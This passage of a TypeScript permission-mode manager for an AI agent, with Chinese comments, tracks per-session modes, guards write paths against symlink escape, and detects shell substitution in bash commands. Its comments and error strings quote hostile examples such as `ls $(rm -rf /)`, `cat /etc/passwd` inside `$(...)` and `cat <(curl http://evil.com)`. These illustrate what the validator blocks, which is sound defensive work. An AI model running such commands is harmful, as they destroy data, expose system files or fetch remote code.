/**
 * 权限模式管理器（Permission Mode Manager）—— 集中维护每个 session 的权限模式状态。
 *
 * Agent 在执行工具（tool use）之前，需要先判断“当前能不能做这件事”，这个判断由权限模式驱动。
 * 每个 session 各自持有自己的 mode 状态，互不污染（无全局可变状态）。
 *
 * 可用权限模式（固定三种）：
 * - 'safe'：只读探索模式，禁止任何写操作，绝不弹窗询问。
 * - 'ask'：默认交互模式，遇到危险操作时弹窗询问用户。
 * - 'allow-all'：跳过所有权限校验，全部放行。
 */

/// <reference path="../types/incr-regex-package.d.ts" />

import { homedir } from 'os';
import { existsSync, realpathSync } from 'fs';
import { debug } from '../utils/debug.ts';
import { dirname, isAbsolute, relative, resolve } from 'path';
import { getSessionSafeAllowedToolNames } from '@craft-agent/session-tools-core';
import { FEATURE_FLAGS } from '../feature-flags.ts';
import { isBrowserToolNameOrAlias } from './browser-tool-names.ts';
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import {
  validateBashCommand,
  hasControlCharacters,
  type BashValidationResult,
  type BashValidationReason,
} from './bash-validator.ts';
import {
  validatePowerShellCommand,
  looksLikePowerShell,
  isPowerShellAvailable,
  extractPowerShellWriteTarget,
  type PowerShellValidationResult,
  type PowerShellValidationReason,
} from './powershell-validator.ts';
import {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  type PermissionModeCanonical,
  toCanonicalPermissionMode,
  parsePermissionMode,
} from './mode-types.ts';

// 引入 incr-regex-package：用于“增量正则匹配”，可以逐字符匹配，
// 找出某条正则在命令串里的“哪一个位置匹配失败”，用于生成更精准的拒绝提示。
import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';

// 把 mode-types 里定义的类型/常量从这里再导出一次，让外部引用统一从本模块入口，
// mode-types 是真正的单一数据源（single source of truth）。
export {
  type PermissionMode,
  type PermissionModeCanonical,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  toCanonicalPermissionMode,
  parsePermissionMode,
};

// 把 PowerShell 校验器中的类型也一并重新导出
export {
  type PowerShellValidationResult,
  type PowerShellValidationReason,
  looksLikePowerShell,
  isPowerShellAvailable,
};

/**
 * 触发模式变更的来源类型。
 * 类比 Go：相当于一个枚举常量。
 */
export type PermissionModeChangedBy = 'user' | 'system' | 'restore' | 'automation' | 'unknown';

/**
 * 单个 session 的权限模式状态快照。
 */
export interface ModeState {
  /** Session 标识 */
  sessionId: string;
  /** 当前权限模式 */
  permissionMode: PermissionMode;
  /** 若发生过模式切换，记录上一次的模式（用于展示“A → B”这类过渡信息） */
  previousPermissionMode?: PermissionMode;
  /** 模式每次变更时单调递增的版本号（可用于检测变化、消费一次性信号） */
  modeVersion: number;
  /** 最近一次模式变更的 ISO 时间戳 */
  lastChangedAt: string;
  /** 最近一次模式变更的发起方 */
  lastChangedBy: PermissionModeChangedBy;
  /** 上一次被消费掉的“由用户发起”的 modeVersion（用于一次性信号机制） */
  lastUserSignalConsumedModeVersion?: number;
  /** 模式状态变化时的回调（可选） */
  onStateChange?: (state: ModeState) => void;
}

/**
 * 模式相关的回调集合。
 */
export interface ModeCallbacks {
  onStateChange?: (state: ModeState) => void;
}

// ============================================================
// 路径匹配工具函数
// ============================================================

/**
 * 把路径开头的 `~` 展开为用户家目录（类似 shell 的 `~` 行为）。
 */
function expandHome(path: string): string {
  if (path.startsWith('~/') || path === '~') {
    return path.replace(/^~/, homedir());
  }
  return path;
}

/**
 * 把简易 glob 模式转成正则。
 * 支持：`**`（跨目录递归）、`*`（单个路径段，不跨 `/`）、`?`（单个字符）。
 */
function globToRegex(pattern: string): RegExp {
  // 先把模式里的 `~` 展开
  const expandedPattern = expandHome(pattern);

  // 转义正则特殊字符，但保留 glob 通配符语义
  let regex = expandedPattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // 转义正则元字符
    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // 先把 ** 临时占位
    .replace(/\*/g, '[^/]*')                // * 只匹配单个路径段（不含 /）
    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** 可匹配任意字符（含 /）
    .replace(/\?/g, '.');                   // ? 匹配单个字符

  return new RegExp(`^${regex}$`);
}

/**
 * 判断给定路径是否命中“允许写入路径”列表中的任意一个 glob 模式。
 */
function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
  // 归一化路径：展开 ~、转绝对路径、统一为正斜杠
  const normalizedPath = normalizeForComparison(expandHome(filePath));

  for (const pattern of allowedPaths) {
    try {
      const regex = globToRegex(pattern);
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches allowed pattern "${pattern}"`);
        return true;
      }
    } catch (e) {
      debug(`[Mode] Invalid glob pattern "${pattern}":`, e);
    }
  }
  return false;
}

/**
 * 对路径做跨平台归一化，便于比较：
 * - 转成绝对路径
 * - 反斜杠统一成正斜杠
 * - Windows 上再转小写，做大小写不敏感比较
 */
function normalizeForComparison(path: string): string {
  const normalized = resolve(path).replace(/\\/g, '/');
  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
}

/**
 * 判断 target 是否“在 base 内”或“等于 base”（基于归一化后的字符串比较）。
 */
function isWithin(base: string, target: string): boolean {
  const normalizedBase = normalizeForComparison(base);
  const normalizedTarget = normalizeForComparison(target);
  const rel = relative(normalizedBase, normalizedTarget);
  return rel === '' || (!rel.startsWith('..') && !isAbsolute(rel));
}

/**
 * 判断 targetPath 是否位于 baseDir 内（或恰好等于 baseDir）。
 *
 * 先用 path.relative 语义做检查，避免“兄弟目录前缀同名”绕过；
 * 然后再用 real path（解析符号链接后的真实路径）复核，防止通过 symlink 逃逸出 baseDir。
 */
function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
  const expandedTarget = expandHome(targetPath);
  const expandedBase = expandHome(baseDir);

  const resolvedTarget = resolve(expandedTarget);
  const resolvedBase = resolve(expandedBase);
  if (!isWithin(resolvedBase, resolvedTarget)) {
    return false;
  }

  const realBase = existsSync(resolvedBase) ? realpathSync.native(resolvedBase) : resolvedBase;

  if (existsSync(resolvedTarget)) {
    const realTarget = realpathSync.native(resolvedTarget);
    return isWithin(realBase, realTarget);
  }

  // 目标路径可能还不存在（比如要新建的文件）。
  // 沿父目录向上找到第一个真实存在的祖先目录，再用它做 real-path 校验，
  // 既允许写新文件，又能防止通过尚未创建的 symlink 链逃逸。
  let current = dirname(resolvedTarget);
  while (true) {
    if (existsSync(current)) {
      const realCurrent = realpathSync.native(current);
      return isWithin(realBase, realCurrent);
    }
    const parent = dirname(current);
    if (parent === current) {
      return false;
    }
    current = parent;
  }
}

// ============================================================
// 权限模式管理类（ModeManager）
// ============================================================

/**
 * 按 session 维护权限模式状态的管理器。
 * 每个 session 拥有独立的状态——刻意避免任何全局可变状态。
 */
class ModeManager {
  // 三个 Map 都以 sessionId 为键，类比 Go 里的 `map[string]T`
  private states: Map<string, ModeState> = new Map();
  private callbacks: Map<string, ModeCallbacks> = new Map();
  private subscribers: Map<string, Set<() => void>> = new Map();

  /**
   * 在不修改当前模式/版本号的前提下，把“上一次的模式”补回到状态里。
   * 主要用于 session 恢复（应用重启后重建过渡信息）。
   */
  setPreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
    const existing = this.getState(sessionId);
    if (existing.previousPermissionMode === previousPermissionMode) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      previousPermissionMode,
    };
    this.states.set(sessionId, newState);
  }

  /**
   * 获取或创建某 session 的状态（若不存在则用默认值初始化）。
   */
  getState(sessionId: string): ModeState {
    let state = this.states.get(sessionId);
    if (!state) {
      state = {
        sessionId,
        permissionMode: 'ask', // 在显式初始化前默认使用 'ask'
        modeVersion: 0,
        lastChangedAt: new Date().toISOString(),
        lastChangedBy: 'system',
      };
      this.states.set(sessionId, state);
    }
    return state;
  }

  /**
   * 设置某 session 的权限模式。
   * @returns 模式确实发生变化返回 true，未变化返回 false。
   */
  setPermissionMode(
    sessionId: string,
    mode: PermissionMode,
    metadata?: { changedBy?: PermissionModeChangedBy; changedAt?: string }
  ): boolean {
    const existing = this.getState(sessionId);

    // 模式没变则直接返回，避免重复日志/事件
    if (existing.permissionMode === mode) {
      return false;
    }

    const changedAt = metadata?.changedAt ?? new Date().toISOString();
    const changedBy = metadata?.changedBy ?? 'unknown';

    // 只有当不是“从 modeVersion=0 的恢复”场景时，才把当前模式记为 previous。
    // 这样 restore 路径不会伪造一段“A→B”的过渡记录。
    const shouldTrackTransition = !(existing.modeVersion === 0 && changedBy === 'restore');

    const newState: ModeState = {
      ...existing,
      previousPermissionMode: shouldTrackTransition ? existing.permissionMode : undefined,
      permissionMode: mode,
      modeVersion: existing.modeVersion + 1,
      lastChangedAt: changedAt,
      lastChangedBy: changedBy,
    };
    this.states.set(sessionId, newState);

    debug(`[Mode] Set permission mode to ${mode} for session ${sessionId} (changedBy=${changedBy}, modeVersion=${newState.modeVersion})`);

    // 通知注册的回调（CraftAgent 内部同步用）
    const callbacks = this.callbacks.get(sessionId);
    if (callbacks?.onStateChange) {
      callbacks.onStateChange(newState);
    }

    // 通知 React 订阅者（配合 useSyncExternalStore 使用）
    this.subscribers.get(sessionId)?.forEach(cb => cb());
    return true;
  }

  /**
   * 标记“当前这次由用户触发的模式变更信号”已被消费。
   * 仅当最近一次变更是用户发起时才生效；否则 no-op。
   */
  consumeUserModeSignal(sessionId: string): void {
    const existing = this.getState(sessionId);
    if (existing.lastChangedBy !== 'user') {
      return;
    }

    if (existing.lastUserSignalConsumedModeVersion === existing.modeVersion) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      lastUserSignalConsumedModeVersion: existing.modeVersion,
    };
    this.states.set(sessionId, newState);
  }

  /**
   * 为某 session 注册回调。
   */
  registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void {
    this.callbacks.set(sessionId, callbacks);
  }

  /**
   * 注销某 session 的回调。
   */
  unregisterCallbacks(sessionId: string): void {
    this.callbacks.delete(sessionId);
  }

  /**
   * 清理某 session 的全部状态（session 结束时调用，避免内存泄漏）。
   */
  cleanupSession(sessionId: string): void {
    this.states.delete(sessionId);
    this.callbacks.delete(sessionId);
    this.subscribers.delete(sessionId);
  }

  /**
   * 订阅某 session 的模式变化（给 React 的 useSyncExternalStore 用）。
   * 返回一个“取消订阅”函数。
   */
  subscribe(sessionId: string, callback: () => void): () => void {
    if (!this.subscribers.has(sessionId)) {
      this.subscribers.set(sessionId, new Set());
    }
    this.subscribers.get(sessionId)!.add(callback);

    // 返回取消订阅函数
    return () => {
      this.subscribers.get(sessionId)?.delete(callback);
    };
  }
}

// 单例管理器实例（全应用共享一个 ModeManager）
export const modeManager = new ModeManager();

// ============================================================
// 权限模式对外 API（封装 modeManager 的薄包装）
// ============================================================

/**
 * 获取某 session 当前的权限模式。
 */
export function getPermissionMode(sessionId: string): PermissionMode {
  return modeManager.getState(sessionId).permissionMode;
}

/**
 * 设置某 session 的权限模式。
 * @returns 模式确实发生变化返回 true，未变化返回 false。
 */
export function setPermissionMode(
  sessionId: string,
  mode: PermissionMode,
  metadata?: { changedBy?: PermissionModeChangedBy; changedAt?: string }
): boolean {
  return modeManager.setPermissionMode(sessionId, mode, metadata);
}

/**
 * 消费“当前 modeVersion 上一次由用户触发的一次性信号”。
 */
export function consumeUserModeSignal(sessionId: string): void {
  modeManager.consumeUserModeSignal(sessionId);
}

/**
 * 循环切换到下一个权限模式（用于 SHIFT+TAB 快捷键）。
 * @param sessionId - 要切换模式的 session
 * @param enabledModes - 可选：允许循环的模式列表（不足 2 个时回退到全部三种模式）
 * @returns 切换后的新模式
 */
export function cyclePermissionMode(
  sessionId: string,
  enabledModes?: PermissionMode[]
): PermissionMode {
  const currentMode = getPermissionMode(sessionId);
  // 启用模式列表有效就用它，否则回退到完整三种模式
  const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : PERMISSION_MODE_ORDER;
  const currentIndex = modes.indexOf(currentMode);

  // 当前模式不在启用列表里，直接跳到第一个启用模式
  if (currentIndex === -1) {
    const nextMode = modes[0] ?? 'ask';
    setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
    return nextMode;
  }

  const nextIndex = (currentIndex + 1) % modes.length;
  // 取模运算保证 nextIndex 一定在范围内，这里类型断言是安全的
  const nextMode = modes[nextIndex] as PermissionMode;
  setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
  return nextMode;
}

/**
 * 订阅某 session 的模式变化（配合 React useSyncExternalStore）。
 * 返回一个“取消订阅”函数。
 */
export function subscribeModeChanges(sessionId: string, callback: () => void): () => void {
  return modeManager.subscribe(sessionId, callback);
}

/**
 * 获取某 session 的完整模式状态。
 */
export function getModeState(sessionId: string): ModeState {
  return modeManager.getState(sessionId);
}

/**
 * 把持久化保存的“上一次模式”补回某 session 的状态中，但不动当前模式。
 */
export function hydratePreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
  modeManager.setPreviousPermissionMode(sessionId, previousPermissionMode);
}

/**
 * 轻量级诊断信息，用于权限拒绝场景和调试。
 */
export function getPermissionModeDiagnostics(sessionId: string): {
  permissionMode: PermissionMode;
  previousPermissionMode?: PermissionMode;
  transitionDisplay?: string;
  modeVersion: number;
  lastChangedAt: string;
  lastChangedBy: PermissionModeChangedBy;
  userModeSignalPending: boolean;
} {
  const state = modeManager.getState(sessionId);
  const transitionDisplay = state.previousPermissionMode
    ? `${PERMISSION_MODE_CONFIG[state.previousPermissionMode].displayName} -> ${PERMISSION_MODE_CONFIG[state.permissionMode].displayName}`
    : undefined;
  const userModeSignalPending =
    state.lastChangedBy === 'user' &&
    state.modeVersion > 0 &&
    state.lastUserSignalConsumedModeVersion !== state.modeVersion;

  return {
    permissionMode: state.permissionMode,
    previousPermissionMode: state.previousPermissionMode,
    transitionDisplay,
    modeVersion: state.modeVersion,
    lastChangedAt: state.lastChangedAt,
    lastChangedBy: state.lastChangedBy,
    userModeSignalPending,
  };
}

/**
 * 初始化某 session 的权限模式状态，并可选地注册回调。
 */
export function initializeModeState(
  sessionId: string,
  initialMode: PermissionMode | { permissionMode?: PermissionMode },
  callbacks?: ModeCallbacks
): void {
  let mode: PermissionMode;

  if (typeof initialMode === 'string') {
    mode = initialMode;
  } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
    mode = initialMode.permissionMode;
  } else {
    // 没有显式指定时默认 'ask'
    mode = 'ask';
  }

  // 重要：必须先注册回调，再设置模式，这样初始状态变化才能触发回调。
  if (callbacks) {
    modeManager.registerCallbacks(sessionId, callbacks);
  }
  modeManager.setPermissionMode(sessionId, mode, { changedBy: 'restore' });
}

/**
 * 清理某 session 的模式状态。
 */
export function cleanupModeState(sessionId: string): void {
  modeManager.cleanupSession(sessionId);
}

// ============================================================
// 工具拦截逻辑（集中实现）
// ============================================================

/**
 * 工具检查时使用的配置类型。
 * 同时兼容 ModeConfig 和 MergedPermissionsConfig 两种结构。
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

/**
 * 危险控制字符集合。
 *
 * 注意：换行（\n）和回车（\r）不在黑名单里——bash-parser 已经把它们当作命令分隔符处理，
 * AST 校验会逐条命令检查。这里只屏蔽 null 字节，因为它可能破坏 C 绑定层的字符串处理。
 */
const DANGEROUS_CONTROL_CHARS = new Set([
  '\x00',  // null 字节：某些上下文里会截断字符串
]);

/**
 * 判断命令中是否包含危险控制字符。
 *
 * @param command - 待校验的 bash 命令
 * @returns 含危险控制字符返回 true，否则 false
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * 判断命令中是否包含危险的“命令/进程替换”模式。
 *
 * 检测项：
 * - 命令替换：`$(...)` 或反引号 `` `...` ``
 * - 进程替换：`<(...)` 或 `>(...)`
 *
 * 之所以危险，是因为这些结构会在“展开”阶段直接执行任意命令：
 * - `ls $(rm -rf /)` —— rm 在参数展开时就会跑
 * - `echo "$(cat /etc/passwd)"` —— 即使在双引号里也会执行
 * - `cat <(curl http://evil.com)` —— 进程替换会真的去跑 curl
 *
 * 注意：单引号内的字符串是安全的字面量，例如 `echo '$(rm)'` 不会触发。
 *
 * @param command - 待校验的 bash 命令
 * @returns 含危险替换返回 true，否则 false
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // 处理转义字符（仅在单引号外生效）
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // 单引号状态跟踪（双引号不能阻挡替换，所以只看单引号）
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // 只在“非单引号”区域内检测危险模式
    if (!inSingleQuote) {
      // 命令替换：$(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // 反引号命令替换
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // 进程替换：<( 或 >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

// ============================================================
// Bash 拒绝原因（用于生成详细错误信息）
// ============================================================

/**
 * 错误信息里附带的“相关模式”信息：提示用户哪些白名单模式可能与该命令相关。
 */
export interface RelevantPatternInfo {
  source: string;
  comment?: string;
}

/**
 * Explore（safe）模式下拒绝某条 bash 命令时的详细原因。
 * 用于产出可读的错误信息，明确告诉用户“被拦了什么、为什么被拦”。
 */
export type BashRejectionReason =
  | { type: 'control_char'; char: string; charCode: number; explanation: string }
  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis; commandHint?: CompiledBlockedCommandHint }
  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
  | { type: 'parse_error'; error: string }
  // 来自 bash-validator 的 AST 校验新增的拒绝原因
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'parameter_expansion'; explanation: string }
  | { type: 'env_assignment'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };

/**
 * 控制字符的“人话”解释，便于在错误信息中说明危险性。
 */
const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
  '\r': 'carriage return can act as command separator',
  '\x00': 'null byte can truncate strings and cause unexpected behavior',
};

/**
 * 在命令中找到第一个危险控制字符；没找到则返回 null。
 */
function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      const charCode = char.charCodeAt(0);
      const displayChar = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char === '\x00' ? '\\0' : `\\x${charCode.toString(16).padStart(2, '0')}`;
      const explanation = CONTROL_CHAR_EXPLANATIONS[char] ?? `control character (code ${charCode}) can cause unexpected behavior`;
      return { char: displayChar, charCode, explanation };
    }
  }
  return null;
}

/**
 * 在命令中查找危险的命令/进程替换；找到则返回其模式与解释，否则返回 null。
 */
function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (!inSingleQuote) {
      if (char === '$' && nextChar === '(') {
        return {
          pattern: '$()',
          explanation: 'command substitution executes embedded commands during expansion (e.g., `ls $(rm -rf /)`)',
        };
      }

      if (char === '`') {
        return {
          pattern: '`...`',
          explanation: 'backtick substitution executes embedded commands (e.g., `echo \\`rm -rf /\\``)',
        };
      }

      if (char === '<' && nextChar === '(') {
        return {
          pattern: '<()',
          explanation: 'process substitution executes commands and provides output as a file (e.g., `cat <(curl evil.com)`)',
        };
      }

      if (char === '>' && nextChar === '(') {
        return {
          pattern: '>()',
          explanation: 'process substitution executes commands with input from a file descriptor',
        };
      }
    }
  }

  return null;
}

/**
 * 找出与当前命令“可能相关”的白名单模式，用于在被拦截时给出更友好的提示。
 * 实现方式：提取命令的第一个 token（命令名），筛选出包含该名字的模式。
 *
 * 例如命令是 `git -C /path status`，就会找出形如 `^git\s+(status|log|...)` 的模式，
 * 让 agent 知道白名单期望的格式长什么样。
 */
function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
  // 取命令第一个 token 作为命令名
  const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstWord) return [];

  // 在模式源串里查找该命令名，这样能匹配 `^git\s+(status|log|...)` 这种模式
  const relevant: RelevantPatternInfo[] = [];

  for (const pattern of patterns) {
    // 用大小写不敏感比较，并尽量在“词边界”附近匹配
    const sourceLower = pattern.source.toLowerCase();
    if (
      sourceLower.includes(firstWord) ||
      sourceLower.startsWith(`^${firstWord}`)
    ) {
      relevant.push({
        source: pattern.source,
        comment: pattern.comment,
      });
    }
  }

  // 只取前 3 条，避免错误信息太长淹没 agent
  return relevant.slice(0, 3);
}

/**
 * 为被拦截的 bash 命令解析“命令专属提示”（hint）。
 * 通过精确匹配基础命令名实现，可选附加 whenNotMatching 触发条件。
 */
function findBlockedCommandHint(command: string, config: ToolCheckConfig): CompiledBlockedCommandHint | undefined {
  const hints = config.blockedCommandHints ?? [];
  if (hints.length === 0) return undefined;

  const firstToken = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstToken) return undefined;
  const baseCommand = firstToken.split('/').pop() ?? firstToken;

  for (const hint of hints) {
    if (hint.command !== baseCommand) continue;

    // 当配置了 whenNotMatching 条件时：只有当命令“不匹配”该条件，才使用本 hint
    if (hint.whenNotMatchingRegex && hint.whenNotMatchingRegex.test(command)) {
      continue;
    }

    return hint;
  }

  return undefined;
}

/**
 * 用“增量正则匹配”分析命令到底为什么没匹配上任何模式。
 * 借助 incr-regex-package 逐字符匹配，定位命令里“匹配在哪里停止”，
 * 从而给出可执行的错误提示。
 *
 * 例如命令 `git -C /path status` 与模式 `^git\s+(status|log|diff)` 匹配时，
 * 能检测到停在 `-C`，并建议在仓库目录内运行命令。
 */
function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) return null;

  // Find the pattern that matches the longest prefix of the command
  // This gives us the "best match" to analyze
  let bestMatch: {
    matchedCount: number;
    matchedPrefix: string;
    pattern: CompiledBashPattern;
  } | null = null;

  for (const pattern of patterns) {
    try {
      // Simplify the pattern for incr-regex: remove anchors and word boundaries
      // which aren't supported by the incremental matching library.
      // This is fine since we only use it for diagnostic purposes.
      const simplifiedPattern = pattern.source
        .replace(/^\^/, '')     // Remove start anchor
        .replace(/\$$/g, '')    // Remove end anchor
        .replace(/\\b/g, '');   // Remove word boundaries

      // Create incremental regex matcher from the simplified pattern
      // IREGEX is a class that takes a regex pattern string in its constructor
      const incr = new IREGEX(simplifiedPattern);

      // Use matchStr to process the entire command and get match info
      // Returns [success, charCount, matchedString]
      const [_success, charCount, matchedStr] = incr.matchStr(trimmedCommand);

      // Track the pattern that matched the most characters (best partial match)
      if (charCount > 0 && (!bestMatch || charCount > bestMatch.matchedCount)) {
        bestMatch = {
          matchedCount: charCount,
          matchedPrefix: matchedStr || trimmedCommand.substring(0, charCount),
          pattern,
        };
      }
    } catch {
      // If incr-regex can't parse the pattern (complex regex features),
      // skip this pattern - we'll fall back to basic diagnostics
      continue;
    }
  }

  // If no pattern matched anything, return null (unknown command)
  if (!bestMatch || bestMatch.matchedCount === 0) {
    return null;
  }

  // Analyze what token caused the mismatch
  const failedPosition = bestMatch.matchedCount;
  const remainingCommand = trimmedCommand.substring(failedPosition).trim();
  const failedToken = remainingCommand.split(/\s+/)[0] || '';

  // Generate a helpful suggestion based on what we found
  const suggestion = generateMismatchSuggestion(
    trimmedCommand,
    bestMatch.matchedPrefix,
    failedToken,
    bestMatch.pattern
  );

  return {
    matchedPrefix: bestMatch.matchedPrefix,
    failedAtPosition: failedPosition,
    failedToken,
    bestMatchPattern: {
      source: bestMatch.pattern.source,
      comment: bestMatch.pattern.comment,
    },
    suggestion,
  };
}

/**
 * Generate an actionable suggestion based on pattern mismatch analysis.
 * Looks for common patterns like flags before subcommands in git/gh/docker.
 */
function generateMismatchSuggestion(
  command: string,
  matchedPrefix: string,
  failedToken: string,
  pattern: CompiledBashPattern
): string | undefined {
  const firstWord = command.split(/\s+/)[0]?.toLowerCase();

  // Detect "flags before subcommand" pattern for git, gh, docker, kubectl
  const commandsWithSubcommands = ['git', 'gh', 'docker', 'kubectl', 'npm', 'yarn', 'cargo'];
  if (
    commandsWithSubcommands.includes(firstWord || '') &&
    failedToken.startsWith('-')
  ) {
    // The command has a flag where a subcommand was expected
    // Try to find the actual subcommand later in the command
    const words = command.split(/\s+/);
    const subcommandCandidates = words.slice(1).filter(w => !w.startsWith('-') && !w.includes('/'));

    if (subcommandCandidates.length > 0) {
      const likelySubcommand = subcommandCandidates[0];
      return `The pattern expects \`${firstWord} <subcommand>\` directly, but found flag \`${failedToken}\` first. ` +
        `Try running from within the target directory, or use: \`${firstWord} ${likelySubcommand} ...\``;
    }

    return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
      `Run from the target directory or switch to Ask/Execute mode.`;
  }

  // Detect possible typos in subcommands using simple heuristics
  // (Check if failedToken is close to any word in the pattern)
  if (pattern.comment && !failedToken.startsWith('-')) {
    // Extract subcommand options from pattern comment if present
    // e.g., "Git read-only operations: view status, history, branches, diffs"
    const commentLower = pattern.comment.toLowerCase();
    const failedTokenLower = failedToken.toLowerCase();

    // Check for common subcommand names in the comment
    const commonSubcommands = ['status', 'log', 'diff', 'show', 'branch', 'list', 'view', 'get', 'describe'];
    for (const sub of commonSubcommands) {
      // Simple Levenshtein-ish check: if token is within 2 chars of a known subcommand
      if (
        commentLower.includes(sub) &&
        Math.abs(failedTokenLower.length - sub.length) <= 2 &&
        failedTokenLower !== sub
      ) {
        // Check if first 2 chars match (simple typo detection)
        if (failedTokenLower.substring(0, 2) === sub.substring(0, 2)) {
          return `Did you mean \`${firstWord} ${sub}\` instead of \`${firstWord} ${failedToken}\`?`;
        }
      }
    }
  }

  // Generic fallback
  return undefined;
}

// ============================================================
// Windows Path Helpers (for bash-parser fallback)
// ============================================================

/**
 * Check if a command looks like a Windows CMD builtin that can't be parsed
 * by bash-parser or normalized via path rewriting.
 */
function looksLikeCmdBuiltin(command: string): boolean {
  // Match CMD builtins at the start of the command (case-insensitive).
  // Note: `type` is excluded because it's also a valid bash builtin (check command type).
  // Note: `mkdir` is excluded because it's also a valid Unix/bash command.
  return /^(?:if\s+(?:not\s+)?exist|for\s+\/[a-z]|set\s+\w+=|copy\s|move\s|ren(?:ame)?\s|del\s|erase\s|rd\s|rmdir\s|md\s|assoc\s|ftype\s)\b/i.test(command);
}

/**
 * Normalize Windows backslash paths in a command string so that bash-parser
 * (a POSIX parser) can handle them without treating \ as escape characters.
 *
 * Converts backslashes to forward slashes inside:
 * - Double-quoted strings: "C:\Users\..." → "C:/Users/..."
 * - Single-quoted strings: passed through (bash-parser treats them as literal anyway)
 * - Unquoted tokens that look like Windows paths: C:\Users\... → C:/Users/...
 *
 * Preserves actual bash escape sequences (\n, \t, \\, \", etc.) inside
 * double-quoted strings by only converting backslashes that precede
 * characters that are NOT standard bash escape targets.
 */
export function normalizeWindowsPathsForBashParser(command: string): string {
  let result = '';
  let i = 0;

  while (i < command.length) {
    const ch = command[i];

    if (ch === "'") {
      // Single-quoted string: copy verbatim (bash treats contents literally)
      const end = command.indexOf("'", i + 1);
      if (end === -1) {
        // Unclosed single quote - copy rest as-is
        result += command.slice(i);
        break;
      }
      result += command.slice(i, end + 1);
      i = end + 1;
    } else if (ch === '"') {
      // Double-quoted string: fix the critical \" issue for Windows paths.
      //
      // In bash, \X inside double quotes is only special for 5 chars: \ " $ ` !
      // For all other chars, bash-parser keeps the literal \X (no stripping).
      // So the ONLY problem case is \" which bash-parser treats as an escaped
      // quote instead of "backslash + closing-quote". This happens when a
      // Windows path ends with \ right before the closing ":
      //   ls "C:\path\"  →  bash-parser sees \" as escaped quote, string never closes
      //
      // Fix: convert \\ to // (prevents double-backslash from eating a path sep)
      // and convert \" to /" (prevents the unclosed-quote parse failure).
      // Leave all other \X alone since bash-parser handles them correctly.
      result += '"';
      i++;
      while (i < command.length && command[i] !== '"') {
        if (command[i] === '\\' && i + 1 < command.length) {
          const next = command[i + 1];
          if (next === '"') {
            // \\" → /" — this is the critical fix for the "Unclosed quote" bug.
            // Convert the backslash to / so bash-parser sees the closing quote.
            result += '/';
            // Don't consume the quote - let the outer loop see it as closing
            i++;
